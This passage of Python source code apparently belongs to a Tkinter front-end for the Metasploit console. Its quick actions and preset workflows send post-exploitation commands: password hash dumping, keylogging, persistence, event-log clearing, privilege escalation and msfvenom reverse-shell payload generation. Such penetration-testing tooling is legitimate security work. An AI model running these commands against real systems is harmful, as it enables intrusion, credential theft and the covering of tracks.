        ttk.Button(dialog, text="Add Step", command=save_step).pack(pady=10)
    
    def edit_workflow_step(self):
        """Edit the selected workflow step."""
        selection = self.workflow_steps_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a step to edit.")
            return
        
        item = selection[0]
        values = self.workflow_steps_tree.item(item, 'values')
        
        dialog = tk.Toplevel(self.root)
        dialog.title("Edit Workflow Step")
        dialog.geometry("500x400")
        
        ttk.Label(dialog, text="Action:").pack(anchor=tk.W, padx=10, pady=5)
        action_var = tk.StringVar(value=values[1])
        action_combo = ttk.Combobox(dialog, textvariable=action_var, values=[
            "use", "set", "exploit", "run", "execute", "upload", "download",
            "screenshot", "hashdump", "getsystem", "shell", "meterpreter"
        ], width=40)
        action_combo.pack(fill=tk.X, padx=10, pady=5)
        
        ttk.Label(dialog, text="Parameters:").pack(anchor=tk.W, padx=10, pady=5)
        params_text = scrolledtext.ScrolledText(dialog, height=5, width=50)
        params_text.insert("1.0", values[2])
        params_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        ttk.Label(dialog, text="Condition (optional):").pack(anchor=tk.W, padx=10, pady=5)
        condition_entry = ttk.Entry(dialog, width=50)
        condition_entry.insert(0, values[3])
        condition_entry.pack(fill=tk.X, padx=10, pady=5)
        
        def save_step():
            action = action_var.get()
            params = params_text.get("1.0", tk.END).strip()
            condition = condition_entry.get().strip()
            
            if not action:
                messagebox.showwarning("Warning", "Please enter an action.")
                return
            
            self.workflow_steps_tree.item(item, values=(values[0], action, params, condition))
            dialog.destroy()
        
        ttk.Button(dialog, text="Save", command=save_step).pack(pady=10)
    
    def remove_workflow_step(self):
        """Remove the selected workflow step."""
        selection = self.workflow_steps_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a step to remove.")
            return
        
        for item in selection:
            self.workflow_steps_tree.delete(item)
        
        # Renumber steps
        for i, item in enumerate(self.workflow_steps_tree.get_children(), 1):
            values = list(self.workflow_steps_tree.item(item, 'values'))
            values[0] = str(i)
            self.workflow_steps_tree.item(item, values=tuple(values))
    
    def move_workflow_step_up(self):
        """Move the selected step up."""
        selection = self.workflow_steps_tree.selection()
        if not selection:
            return
        
        item = selection[0]
        prev_item = self.workflow_steps_tree.prev(item)
        if prev_item:
            prev_values = self.workflow_steps_tree.item(prev_item, 'values')
            curr_values = self.workflow_steps_tree.item(item, 'values')
            self.workflow_steps_tree.item(prev_item, values=curr_values)
            self.workflow_steps_tree.item(item, values=prev_values)
            self.workflow_steps_tree.selection_set(item)
    
    def move_workflow_step_down(self):
        """Move the selected step down."""
        selection = self.workflow_steps_tree.selection()
        if not selection:
            return
        
        item = selection[0]
        next_item = self.workflow_steps_tree.next(item)
        if next_item:
            next_values = self.workflow_steps_tree.item(next_item, 'values')
            curr_values = self.workflow_steps_tree.item(item, 'values')
            self.workflow_steps_tree.item(next_item, values=curr_values)
            self.workflow_steps_tree.item(item, values=next_values)
            self.workflow_steps_tree.selection_set(item)
    
    def run_workflow(self):
        """Execute the current workflow."""
        if not self.current_workflow:
            messagebox.showwarning("Warning", "No workflow loaded.")
            return
        
        if not self.console or not self.console.running:
            messagebox.showwarning("Warning", "Console is not running.")
            return
        
        steps = []
        for item in self.workflow_steps_tree.get_children():
            values = self.workflow_steps_tree.item(item, 'values')
            steps.append({
                'action': values[1],
                'parameters': values[2],
                'condition': values[3]
            })
        
        if not steps:
            messagebox.showwarning("Warning", "Workflow has no steps.")
            return
        
        # Execute steps
        for step in steps:
            action = step['action']
            params = step['parameters']
            
            if action == "use":
                self.console.send_command(f"use {params}")
            elif action == "set":
                for param in params.split('\n'):
                    if param.strip():
                        self.console.send_command(f"set {param.strip()}")
            elif action == "exploit":
                self.console.send_command("exploit")
            elif action == "run":
                self.console.send_command("run")
            else:
                # Generic command
                cmd = f"{action} {params}" if params else action
                self.console.send_command(cmd)
            
            # Small delay between steps
            self.root.update()
            threading.Event().wait(0.5)
        
        messagebox.showinfo("Success", "Workflow execution started.")
    
    def preview_workflow(self):
        """Preview workflow steps."""
        steps = []
        for item in self.workflow_steps_tree.get_children():
            values = self.workflow_steps_tree.item(item, 'values')
            steps.append(f"Step {values[0]}: {values[1]} - {values[2]}")
        
        preview_text = "\n".join(steps) if steps else "No steps defined."
        messagebox.showinfo("Workflow Preview", preview_text)
    
    def load_preset_workflow(self, preset_name):
        """Load a preset workflow."""
        presets = {
            "Basic Recon": {
                'steps': [
                    {'action': 'use', 'parameters': 'auxiliary/scanner/portscan/tcp', 'condition': ''},
                    {'action': 'set', 'parameters': 'RHOSTS <target>', 'condition': ''},
                    {'action': 'run', 'parameters': '', 'condition': ''},
                ]
            },
            "Windows Post-Exploit": {
                'steps': [
                    {'action': 'getsystem', 'parameters': '', 'condition': ''},
                    {'action': 'hashdump', 'parameters': '', 'condition': ''},
                    {'action': 'screenshot', 'parameters': '', 'condition': ''},
                ]
            },
        }
        
        if preset_name in presets:
            workflow = {
                'name': preset_name,
                'steps': presets[preset_name]['steps']
            }
            
            self.workflows.append(workflow)
            self.current_workflow = workflow
            
            self.workflow_combo['values'] = [w['name'] for w in self.workflows]
            self.workflow_var.set(preset_name)
            
            self.workflow_name_entry.delete(0, tk.END)
            self.workflow_name_entry.insert(0, preset_name)
            
            for item in self.workflow_steps_tree.get_children():
                self.workflow_steps_tree.delete(item)
            
            for i, step in enumerate(workflow['steps'], 1):
                self.workflow_steps_tree.insert('', tk.END, values=(
                    str(i),
                    step.get('action', ''),
                    step.get('parameters', ''),
                    step.get('condition', '')
                ))
    
    # ==================== SESSION GROUPS METHODS ====================
    
    def create_session_group(self):
        """Create a new session group."""
        name = self.group_name_entry.get().strip()
        if not name:
            messagebox.showwarning("Warning", "Please enter a group name.")
            return
        
        if name in self.session_groups:
            messagebox.showwarning("Warning", "Group already exists.")
            return
        
        self.session_groups[name] = {
            'sessions': [],
            'description': ''
        }
        
        self.session_groups_tree.insert('', tk.END, text=name, values=(name, '0', ''))
        self.group_name_entry.delete(0, tk.END)
        self.refresh_session_groups()
    
    def delete_session_group(self):
        """Delete the selected session group."""
        selection = self.session_groups_tree.selection()
        if not selection:
            messagebox.showwarning("Warning", "Please select a group to delete.")
            return
        
        item = selection[0]
        group_name = self.session_groups_tree.item(item, 'text')
        
        if messagebox.askyesno("Confirm", f"Delete group '{group_name}'?"):
            if group_name in self.session_groups:
                del self.session_groups[group_name]
            
            self.session_groups_tree.delete(item)
            self.refresh_session_groups()
    
    def refresh_session_groups(self):
        """Refresh the session groups display."""
        # Refresh groups tree
        for item in list(self.session_groups_tree.get_children()):
            group_name = self.session_groups_tree.item(item, 'text')
            if group_name in self.session_groups:
                group = self.session_groups[group_name]
                session_count = len(group['sessions'])
                desc = group.get('description', '')
                self.session_groups_tree.item(item, values=(group_name, str(session_count), desc))
        
        # Refresh available sessions
        self.refresh_available_sessions()
    
    def on_group_selected(self, event):
        """Handle group selection."""
        selection = self.session_groups_tree.selection()
        if not selection:
            return
        
        item = selection[0]
        group_name = self.session_groups_tree.item(item, 'text')
        
        # Clear group sessions tree
        for item in self.group_sessions_tree.get_children():
            self.group_sessions_tree.delete(item)
        
        # Load sessions for this group
        if group_name in self.session_groups:
            group = self.session_groups[group_name]
            for session_id in group['sessions']:
                # Get session info from session manager data if available
                self.group_sessions_tree.insert('', tk.END, values=(
                    session_id, 'unknown', '', ''
                ))
    
    def refresh_available_sessions(self):
        """Refresh the list of available sessions."""
        # Clear existing
        for item in self.available_sessions_tree.get_children():
            self.available_sessions_tree.delete(item)
        
        # Get sessions from session manager if available
        if hasattr(self, 'session_list_data') and self.session_list_data:
            for session_data in self.session_list_data:
                session_id = session_data.get('id', '')
                
                # Find which group this session belongs to
                current_group = ''
                for group_name, group_data in self.session_groups.items():
                    if session_id in group_data['sessions']:
                        current_group = group_name
                        break
                
                self.available_sessions_tree.insert('', tk.END, values=(
                    session_id,
                    session_data.get('type', 'unknown'),
                    session_data.get('target', ''),
                    session_data.get('info', ''),
                    current_group
                ))
        
        # Also request fresh session list
        if self.console and self.console.running:
            self.console.send_command("sessions -l")
    
    def add_sessions_to_group(self):
        """Add selected sessions to the currently selected group."""
        selection_groups = self.session_groups_tree.selection()
        selection_sessions = self.available_sessions_tree.selection()
        
        if not selection_groups:
            messagebox.showwarning("Warning", "Please select a group.")
            return
        
        if not selection_sessions:
            messagebox.showwarning("Warning", "Please select session(s) to add.")
            return
        
        group_item = selection_groups[0]
        group_name = self.session_groups_tree.item(group_item, 'text')
        
        if group_name not in self.session_groups:
            return
        
        added_count = 0
        for session_item in selection_sessions:
            values = self.available_sessions_tree.item(session_item, 'values')
            session_id = values[0]
            
            if session_id not in self.session_groups[group_name]['sessions']:
                self.session_groups[group_name]['sessions'].append(session_id)
                added_count += 1
        
        if added_count > 0:
            self.refresh_session_groups()
            self.on_group_selected(None)  # Refresh group sessions display
            messagebox.showinfo("Success", f"Added {added_count} session(s) to group.")
    
    # ==================== QUICK ACTIONS METHODS ====================
    
    def quick_action_scan_ports(self):
        """Quick action: Port scan."""
        target = simpledialog.askstring("Port Scan", "Enter target IP or range:")
        if target and self.console and self.console.running:
            self.console.send_command(f"db_nmap -p- {target}")
            messagebox.showinfo("Info", "Port scan started. Check console output.")
    
    def quick_action_service_enum(self):
        """Quick action: Service enumeration."""
        target = simpledialog.askstring("Service Enum", "Enter target IP:")
        if target and self.console and self.console.running:
            self.console.send_command(f"use auxiliary/scanner/portscan/tcp")
            self.console.send_command(f"set RHOSTS {target}")
            self.console.send_command("run")
    
    def quick_action_os_detect(self):
        """Quick action: OS detection."""
        target = simpledialog.askstring("OS Detection", "Enter target IP:")
        if target and self.console and self.console.running:
            self.console.send_command(f"use auxiliary/scanner/discovery/udp_sweep")
            self.console.send_command(f"set RHOSTS {target}")
            self.console.send_command("run")
    
    def quick_action_vuln_scan(self):
        """Quick action: Vulnerability scan."""
        target = simpledialog.askstring("Vulnerability Scan", "Enter target IP:")
        if target and self.console and self.console.running:
            self.console.send_command(f"use auxiliary/scanner/portscan/tcp")
            self.console.send_command(f"set RHOSTS {target}")
            self.console.send_command("run")
    
    def quick_action_dns_enum(self):
        """Quick action: DNS enumeration."""
        domain = simpledialog.askstring("DNS Enumeration", "Enter domain name:")
        if domain and self.console and self.console.running:
            self.console.send_command(f"use auxiliary/gather/dns_enum")
            self.console.send_command(f"set DOMAIN {domain}")
            self.console.send_command("run")
    
    def quick_action_smb_enum(self):
        """Quick action: SMB enumeration."""
        target = simpledialog.askstring("SMB Enumeration", "Enter target IP:")
        if target and self.console and self.console.running:
            self.console.send_command(f"use auxiliary/scanner/smb/smb_version")
            self.console.send_command(f"set RHOSTS {target}")
            self.console.send_command("run")
    
    def quick_action_getsystem(self):
        """Quick action: Get system."""
        session = simpledialog.askstring("Get System", "Enter session ID:")
        if session and self.console and self.console.running:
            self.console.send_command(f"sessions -i {session}")
            self.console.send_command("getsystem")
    
    def quick_action_hashdump(self):
        """Quick action: Hash dump."""
        session = simpledialog.askstring("Hash Dump", "Enter session ID:")
        if session and self.console and self.console.running:
            self.console.send_command(f"sessions -i {session}")
            self.console.send_command("hashdump")
    
    def quick_action_screenshot(self):
        """Quick action: Screenshot."""
        session = simpledialog.askstring("Screenshot", "Enter session ID:")
        if session and self.console and self.console.running:
            self.console.send_command(f"sessions -i {session}")
            self.console.send_command("screenshot")
    
    def quick_action_keylog_start(self):
        """Quick action: Start keylogger."""
        session = simpledialog.askstring("Keylogger", "Enter session ID:")
        if session and self.console and self.console.running:
            self.console.send_command(f"sessions -i {session}")
            self.console.send_command("keyscan_start")
    
    def quick_action_download(self):
        """Quick action: Download file."""
        session = simpledialog.askstring("Download File", "Enter session ID:")
        if session and self.console and self.console.running:
            file_path = simpledialog.askstring("Download File", "Enter file path to download:")
            if file_path:
                self.console.send_command(f"sessions -i {session}")
                self.console.send_command(f"download {file_path}")
    
    def quick_action_upload(self):
        """Quick action: Upload file."""
        session = simpledialog.askstring("Upload File", "Enter session ID:")
        if session and self.console and self.console.running:
            file_path = filedialog.askopenfilename(title="Select file to upload")
            if file_path:
                remote_path = simpledialog.askstring("Upload File", "Enter remote path:")
                if remote_path:
                    self.console.send_command(f"sessions -i {session}")
                    self.console.send_command(f"upload {file_path} {remote_path}")
    
    def quick_action_persistence(self):
        """Quick action: Install persistence."""
        session = simpledialog.askstring("Persistence", "Enter session ID:")
        if session and self.console and self.console.running:
            self.console.send_command(f"sessions -i {session}")
            self.console.send_command("run persistence -X -i 5 -p 4444 -r 0.0.0.0")
    
    def quick_action_clearev(self):
        """Quick action: Clear event logs."""
        session = simpledialog.askstring("Clear Event Logs", "Enter session ID:")
        if session and self.console and self.console.running:
            self.console.send_command(f"sessions -i {session}")
            self.console.send_command("clearev")
    
    def quick_action_win_escalate(self):
        """Quick action: Windows privilege escalation."""
        session = simpledialog.askstring("Windows Escalate", "Enter session ID:")
        if session and self.console and self.console.running:
            self.console.send_command(f"sessions -i {session}")
            self.console.send_command("getsystem")
            self.console.send_command("run post/windows/escalate/getsystem")
    
    def quick_action_linux_escalate(self):
        """Quick action: Linux privilege escalation."""
        session = simpledialog.askstring("Linux Escalate", "Enter session ID:")
        if session and self.console and self.console.running:
            self.console.send_command(f"sessions -i {session}")
            self.console.send_command("run post/linux/gather/hashdump")
    
    def quick_action_check_exploits(self):
        """Quick action: Check available exploits."""
        if self.console and self.console.running:
            self.console.send_command("search type:exploit")
    
    def quick_action_suggest_exploits(self):
        """Quick action: Suggest exploits."""
        if self.console and self.console.running:
            messagebox.showinfo("Info", "Use the Exploit Search tab to find exploits.")
    
    def quick_action_gen_payload(self, platform):
        """Quick action: Generate payload."""
        if platform == "windows":
            self.notebook.select(self.index("Payload Generator"))
            if hasattr(self, 'payload_type_combo'):
                self.payload_type_combo.set("windows/meterpreter/reverse_tcp")
        elif platform == "linux":
            self.notebook.select(self.index("Payload Generator"))
            if hasattr(self, 'payload_type_combo'):
                self.payload_type_combo.set("linux/x64/meterpreter/reverse_tcp")
    
    def quick_action_gen_msfvenom(self):
        """Quick action: Generate MSFVenom command."""
        dialog = tk.Toplevel(self.root)
        dialog.title("MSFVenom Command Generator")
        dialog.geometry("600x400")
        
        ttk.Label(dialog, text="This will show a command you can run in terminal:").pack(pady=10)
        
        lhost = simpledialog.askstring("MSFVenom", "LHOST:")
        if lhost:
            lport = simpledialog.askstring("MSFVenom", "LPORT:", initialvalue="4444")
            if lport:
                cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o payload.exe"
                text_widget = scrolledtext.ScrolledText(dialog, wrap=tk.WORD, height=10)
                text_widget.insert("1.0", cmd)
                text_widget.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
    
    def quick_action_import_nmap(self):
        """Quick action: Import Nmap scan."""
        file_path = filedialog.askopenfilename(title="Select Nmap XML file", filetypes=[("XML files", "*.xml")])
        if file_path and self.console and self.console.running:
            self.console.send_command(f"db_import {file_path}")
    
    def quick_action_export_data(self):
        """Quick action: Export database data."""
        if self.console and self.console.running:
            messagebox.showinfo("Info", "Use the Database Manager tab to export data.")
    
    def quick_action_clear_db(self):
        """Quick action: Clear database."""
        if messagebox.askyesno("Confirm", "Clear all database data?"):
            if self.console and self.console.running:
                self.console.send_command("db_connect")  # Disconnect and reconnect to reset
                messagebox.showinfo("Info", "Database cleared.")
    
    def quick_action_db_status(self):
        """Quick action: Check database status."""
        if self.console and self.console.running:
            self.console.send_command("db_status")
        else:
            messagebox.showinfo("Database Status", f"Database Connected: {self.database_connected}")
    
    def on_closing(self):
        """Handle window close event."""
        if HAS_PYSTRAY and self.tray_icon:
            self.hide_to_tray()
        else:
            if self.console:
                self.console.stop()
            self.root.destroy()

def main():
    """Main entry point."""
    root = tk.Tk()
    app = MetasploitGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
